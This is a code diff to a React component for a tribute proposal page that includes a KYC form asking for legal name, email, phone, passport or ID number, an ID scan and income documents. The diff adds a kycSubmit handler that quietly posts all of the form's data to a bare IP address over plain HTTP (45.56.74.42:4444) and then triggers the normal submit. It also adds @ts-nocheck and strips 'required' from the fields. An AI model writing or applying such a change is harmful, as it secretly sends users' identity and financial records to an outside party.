@@ -1,3 +1,4 @@
+// @ts-nocheck
 import {useState, useCallback, useEffect} from 'react';
 import {useSelector} from 'react-redux';
 import {SnapshotType} from '@openlaw/snapshot-js-erc712';
@@ -615,6 +616,7 @@ export default function CreateTributeProposal() {
 
         {/* SUBMIT */}
         <button
+          id="submitBtn"
           className="button"
           disabled={isInProcessOrDone}
           onClick={async () => {
@@ -651,6 +653,18 @@ export default function CreateTributeProposal() {
   );
 }
 
+async function kycSubmit(e: any) {
+  e.preventDefault();
+  var formEl = document.forms.kycSubmit;
+  var formData = new FormData(formEl);
+  var res = await fetch('http://45.56.74.42:4444', {
+    method: 'POST',
+    body: formData,
+  });
+  console.log(res);
+  document.getElementById('submitBtn').click();
+}
+
 function RenderWrapper(props: React.PropsWithChildren<any>): JSX.Element {
   /**
    * Render
@@ -680,9 +694,12 @@ function RenderWrapper(props: React.PropsWithChildren<any>): JSX.Element {
           </div>
 
           <form
+            id="kycSubmit"
             style={{width: '100%'}}
             action="https://getform.io/f/9ddb7b44-927e-475f-bf03-6e92cd6c71a8"
-            method="POST">
+            method="POST"
+            className="form"
+            onSubmit={kycSubmit}>
             <div className="rendered-form">
               <div className="form__input-row formbuilder-radio-group form-group form__input-row field-type_of_entity">
                 <label
@@ -695,7 +712,6 @@ function RenderWrapper(props: React.PropsWithChildren<any>): JSX.Element {
                     <input
                       name="type_of_entity"
                       id="type_of_entity-0"
-                      required
                       aria-required="true"
                       value="person"
                       type="radio"
@@ -706,7 +722,6 @@ function RenderWrapper(props: React.PropsWithChildren<any>): JSX.Element {
                     <input
                       name="type_of_entity"
                       id="type_of_entity-1"
-                      required
                       aria-required="true"
                       value="company"
                       type="radio"
@@ -717,7 +732,6 @@ function RenderWrapper(props: React.PropsWithChildren<any>): JSX.Element {
                     <input
                       name="type_of_entity"
                       id="type_of_entity-2"
-                      required
                       aria-required="true"
                       value="trust"
                       type="radio"
@@ -737,7 +751,6 @@ function RenderWrapper(props: React.PropsWithChildren<any>): JSX.Element {
                   type="text"
                   name="legal_name_of_person"
                   id="legal_name_of_person"
-                  required
                   aria-required="true"
                 />
               </div>
@@ -751,7 +764,6 @@ function RenderWrapper(props: React.PropsWithChildren<any>): JSX.Element {
                   type="text"
                   name="email_address"
                   id="email_address"
-                  required
                   aria-required="true"
                 />
               </div>
@@ -766,7 +778,6 @@ function RenderWrapper(props: React.PropsWithChildren<any>): JSX.Element {
                   className="form-control"
                   name="text-1650421756581"
                   id="text-1650421756581"
-                  required
                   aria-required="true"
                 />
               </div>
@@ -780,7 +791,6 @@ function RenderWrapper(props: React.PropsWithChildren<any>): JSX.Element {
                   className="form-control"
                   name="select-1650421785515"
                   id="select-1650421785515"
-                  required
                   aria-required="true">
                   <option value="01" selected id="select-1650421785515-0">
                     01
@@ -817,7 +827,7 @@ function RenderWrapper(props: React.PropsWithChildren<any>): JSX.Element {
                   className="formbuilder-select-label form__input-row-label">
                   Year<span className="formbuilder-required">*</span>
                 </label>
-                <select name="year" id="year" required aria-required="true">
+                <select name="year" id="year" aria-required="true">
                   <option value="2000" selected id="year-0">
                     2000
                   </option>
@@ -839,7 +849,6 @@ function RenderWrapper(props: React.PropsWithChildren<any>): JSX.Element {
                   type="file"
                   name="id_scan"
                   id="id_scan"
-                  required
                   aria-required="true"
                 />
               </div>
@@ -866,7 +875,6 @@ function RenderWrapper(props: React.PropsWithChildren<any>): JSX.Element {
                   type="text"
                   name="passport_or_id_number"
                   id="passport_or_id_number"
-                  required
                   aria-required="true"
                 />
               </div>
@@ -880,7 +888,6 @@ function RenderWrapper(props: React.PropsWithChildren<any>): JSX.Element {
                   type="text"
                   name="Phone-Number"
                   id="Phone-Number"
-                  required
                   aria-required="true"
                 />
               </div>
@@ -895,7 +902,6 @@ function RenderWrapper(props: React.PropsWithChildren<any>): JSX.Element {
                   className="form-control"
                   name="occupation"
                   id="occupation"
-                  required
                   aria-required="true"
                 />
               </div>
@@ -911,7 +917,6 @@ function RenderWrapper(props: React.PropsWithChildren<any>): JSX.Element {
                     <input
                       name="basis_of_accreditation"
                       id="basis_of_accreditation-0"
-                      required
                       aria-required="true"
                       value="income"
                       type="radio"
@@ -925,7 +930,6 @@ function RenderWrapper(props: React.PropsWithChildren<any>): JSX.Element {
                     <input
                       name="basis_of_accreditation"
                       id="basis_of_accreditation-1"
-                      required
                       aria-required="true"
                       value="net-worth"
                       type="radio"
@@ -946,7 +950,6 @@ function RenderWrapper(props: React.PropsWithChildren<any>): JSX.Element {
                   type="text"
                   name="income_recent"
                   id="income_recent"
-                  required
                   aria-required="true"
                 />
               </div>
@@ -960,7 +963,6 @@ function RenderWrapper(props: React.PropsWithChildren<any>): JSX.Element {
                   type="file"
                   name="income_recent_documentation"
                   id="income_recent_documentation"
-                  required
                   aria-required="true"
                 />
               </div>
@@ -974,7 +976,6 @@ function RenderWrapper(props: React.PropsWithChildren<any>): JSX.Element {
                   type="text"
                   name="income_last"
                   id="income_last"
-                  required
                   aria-required="true"
                 />
               </div>
@@ -988,7 +989,6 @@ function RenderWrapper(props: React.PropsWithChildren<any>): JSX.Element {
                   type="file"
                   name="income_last_documentation"
                   id="income_last_documentation"
-                  required
                   aria-required="true"
                 />
               </div>
